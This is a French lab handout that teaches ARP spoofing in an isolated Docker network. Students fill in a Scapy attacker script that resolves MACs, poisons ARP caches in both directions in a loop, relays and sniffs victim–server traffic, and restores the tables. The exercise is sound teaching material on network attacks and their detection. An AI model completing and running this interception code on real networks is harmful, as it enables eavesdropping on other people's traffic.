# TP : Découverte de l'ARP Spoofing

# Attention! Le tp doit être fait sous VDN! Prenez l'image VDN de Docker

## Clonnez le REPO: 
git@github.com:WailRoth/arp-spoofing-student-tp.git

## Objectif pédagogique

Ce TP vise à vous faire découvrir le fonctionnement de l'ARP spoofing (ou ARP poisoning), une attaque réseau permettant d'intercepter des communications entre deux machines. Vous allez manipuler un environnement contrôlé pour comprendre comment cette attaque fonctionne et comment la détecter.

## Nettoyage

Pour arrêter proprement la démo :

```bash
docker-compose down
```

## Ressources complémentaires

- RFC 826 : An Ethernet Address Resolution Protocol
- Man-in-the-middle attacks documentation
- Dynamic ARP Inspection (DAI) - Cisco
- ARPwatch - Outil de détection d'anomalies ARP

---

## Contexte : Qu'est-ce que l'ARP ?

L'Address Resolution Protocol (ARP) est un protocole utilisé pour faire correspondre une adresse IP à une adresse MAC (adresse physique) sur un réseau local. Quand une machine veut communiquer avec une autre sur le même réseau, elle utilise ARP pour découvrir l'adresse MAC correspondant à l'adresse IP de destination.

### Le problème de sécurité

ARP ne dispose d'aucun mécanisme d'authentification. N'importe quelle machine peut répondre à une requête ARP avec n'importe quelle adresse MAC. C'est cette faille qui est exploitée dans l'ARP spoofing.

## Architecture de la démo

Notre environnement Docker simule trois machines sur un réseau local :

```
┌─────────────┐     ┌─────────────┐     ┌─────────────┐
│   VICTIME   │     │  ATTAQUANT  │     │   SERVEUR   │
│  172.28.0.20│◄────►│ 172.28.0.30 │◄────►│ 172.28.0.10 │
│             │     │             │     │             │
│ Envoie des  │     │ Intercepte  │     │ Reçoit les  │
│ requêtes    │     │ et relaie   │     │ requêtes    │
└─────────────┘     └─────────────┘     └─────────────┘
```

- **Serveur** (`172.28.0.10`) : Service HTTP qui reçoit les requêtes
- **Victime** (`172.28.0.20`) : Client qui envoie périodiquement des requêtes JSON
- **Attaquant** (`172.28.0.30`) : Machine malveillante qui intercepte le trafic

## Étape 1 : Lancement de l'environnement

### Exercice 1 : Compréhension du Docker Compose

Analysez le fichier `docker-compose.yml` et répondez aux questions suivantes :

1. **Question** : Pourquoi l'attaquant a-t-il besoin des capacités `NET_ADMIN` et `NET_RAW` ?

2. **Question** : Pourquoi utilise-t-on des adresses IP fixes dans ce TP ?

### Lancement de la démo

```bash
# Lancement des trois conteneurs
docker-compose up --build
```

## Étape 2 : Observation du trafic normal

Laissez la démo tourner quelques secondes. Observez les logs de chaque conteneur dans des terminaux séparés :

```bash
# Terminal 1 : Logs de la victime
docker-compose logs -f victim

# Terminal 2 : Logs du serveur
docker-compose logs -f server

# Terminal 3 : Logs de l'attaquant
docker-compose logs -f attacker
```

### Exercice 2 : Analyse du comportement normal

1. **Question** : Que remarquez-vous dans les logs de la victime ? Décrivez le pattern des messages.

2. **Question** : Comment le serveur traite-t-il les requêtes de la victime ? Que remarquez-vous sur les adresses MAC ?

## Étape 3 : L'attaque ARP Spoofing

### Compréhension de l'attaque

L'attaquant va maintenant envoyer des réponses ARP falsifiées pour se faire passer pour :
- Le serveur auprès de la victime
- La victime auprès du serveur

### Exercice 3 : Code à compléter - L'attaquant

Le fichier `attacker/attacker.py` contient plusieurs sections à compléter. Ces trous sont conçus pour vous forcer à lire le code et comprendre les étapes clés de l'attaque.

**Analysez d'abord attentivement tout le code, puis complétez les sections suivantes :**

#### 3.1 : Résolution d'adresse MAC (lignes 60-66)

```python
# TODO: Créer un paquet Ether(dst="BROADCAST_MAC") / ARP(pdst=TARGET_IP)
packet = PACKET_ARP  # TODO: à compléter
answered, _ = srp(packet, timeout=2, retry=3, iface=iface, verbose=0)
for _, response in answered:
    mac = RESPONSE_MAC  # TODO: extraire la MAC depuis response[Ether].src
```

**Question** : À quoi sert cette fonction `resolve_mac()` et pourquoi est-elle essentielle pour l'attaque ?

#### 3.2 : Empoisonnement ARP bidirectionnel (lignes 70-91)

```python
def poison_arp(victim_mac: str, server_mac: str, attacker_mac: str) -> None:
    """
    ÉTAPE 2 : Empoisonnement ARP bidirectionnel.

    Diffuse en boucle deux réponses ARP falsifiées pour que victime et serveur
    nous croient à l'autre bout.

    TODO : Compléter les trames ARP falsifiées avec les bonnes IP sources (psrc).
    """
    log("starting ARP poisoning loop")
    # TODO: Compléter les champs psrc pour usurper les identités
    frame_to_victim = Ether(dst=victim_mac, src=attacker_mac) / ARP(
        op=2, pdst=VICTIM_IP, hwdst=victim_mac, psrc=SPOOFED_IP_FOR_VICTIM, hwsrc=attacker_mac  # TODO: quelle IP usurper ?
    )
    frame_to_server = Ether(dst=server_mac, src=attacker_mac) / ARP(
        op=2, pdst=SERVER_IP, hwdst=server_mac, psrc=SPOOFED_IP_FOR_SERVER, hwsrc=attacker_mac  # TODO: quelle IP usurper ?
    )
    while not stop_event.is_set():
        sendp(frame_to_victim, verbose=0, iface=INTERFACE)
        sendp(frame_to_server, verbose=0, iface=INTERFACE)
        time.sleep(POISON_INTERVAL)
    log("ARP poisoning loop stopped")
```

#### 3.3 : Restauration des tables ARP légitimes (lignes 94-118)

```python
def restore_arp(victim_mac: str, server_mac: str) -> None:
    """
    ÉTAPE 3 : Restauration des tables ARP légitimes.

    Réémet des annonces ARP légitimes pour rendre les caches cohérents avant de quitter.

    TODO : Compléter les adresses MAC sources (src et hwsrc) avec les VRAIES MACs.
    """
    # TODO: Compléter avec les vraies MACs
    sendp(
        Ether(dst=victim_mac, src=REAL_SERVER_MAC)  # TODO: quelle MAC source ?
        / ARP(op=2, pdst=VICTIM_IP, hwdst=victim_mac, psrc=SERVER_IP, hwsrc=REAL_SERVER_MAC),  # TODO: quelle MAC ?
        count=5,
        inter=0.2,
        verbose=0,
        iface=INTERFACE,
    )
    sendp(
        Ether(dst=server_mac, src=REAL_VICTIM_MAC)  # TODO: quelle MAC source ?
        / ARP(op=2, pdst=SERVER_IP, hwdst=server_mac, psrc=VICTIM_IP, hwsrc=REAL_VICTIM_MAC),  # TODO: quelle MAC ?
        count=5,
        inter=0.2,
        verbose=0,
        iface=INTERFACE,
    )
```

#### 3.4 : Interception et transfert des paquets (lignes 143-164)

```python
# TODO: Compléter les conditions pour détecter la direction
if packet[IP].src == VICTIM_IP and packet[IP].dst == DESTINATION_IP:  # TODO: quelle IP ?
    direction = "victim->server"
    dst_mac = DESTINATION_MAC  # TODO: vers quelle MAC envoyer ?
elif packet[IP].src == SOURCE_IP and packet[IP].dst == VICTIM_IP:  # TODO: quelle IP ?
    direction = "server->victim"
    dst_mac = DESTINATION_MAC  # TODO: vers quelle MAC envoyer ?

# TODO: Reconstruire la trame avec la bonne MAC de destination
new_packet = Ether(src=attacker_mac, dst=DST_MAC) / packet[IP]  # TODO: utiliser dst_mac
```

**Question** : Comment l'attaquant détermine-t-il si un paquet va de la victime vers le serveur ou l'inverse ? Pourquoi doit-il modifier l'en-tête Ethernet ?

#### 3.5 : Capture des paquets Scapy

```python
def sniff_packets(victim_mac: str, server_mac: str, attacker_mac: str) -> None:
    """
    ÉTAPE 5 : Capture des paquets avec Scapy.

    Démarre le sniffer Scapy et redirige chaque paquet vers le handler MITM.

    TODO : Compléter le filtre BPF pour capturer uniquement le trafic victime↔serveur.
    """
    log("starting packet sniffer")

    def handler(pkt):
        forward_packet(pkt, victim_mac, server_mac, attacker_mac)

    # TODO: Compléter le filtre pour capturer les paquets entre VICTIM_IP et SERVER_IP
    sniff(
        iface=INTERFACE,
        prn=handler,
        store=False,
        stop_filter=lambda _: stop_event.is_set(),
        filter=BPF_FILTER,  # TODO: "ip host ... and ip host ..."
    )
```

## Étape 4 : Observation de l'attaque

Une fois que vous avez observé les quelques premières requêtes, vous devriez voir l'attaque se mettre en place.

### Exercice 4 : Analyse de l'attaque

1. **Question** : Que remarquez-vous dans les logs de l'attaquant ? Quels types de messages voit-il ?

2. **Question** : Pourquoi la victime continue-t-elle de fonctionner normalement malgré l'interception ?

3. **Question** : Que se passe-t-il au niveau des adresses MAC dans les logs de la victime ? Expliquez.

4. **Question** : L'attaquant peut-il lire le contenu des requêtes ? Justifiez avec les logs observés.

## Étape 5 : Compréhension technique

### Exercice 5 : Analyse du code de l'attaquant

Analysez le fichier `attacker/attacker.py` et répondez :

1. **Question** : Dans la fonction `poison_arp()`, quels sont les deux paquets ARP envoyés et à quoi servent-ils ?

2. **Question** : Pourquoi l'attaquant doit-il maintenir l'empoisonnement en boucle (voir la boucle while) ?

3. **Question** : Testez manuellement l'attaque : que se passe-t-il si vous commentez temporairement les lignes `sendp()` dans la boucle `poison_arp()` ?

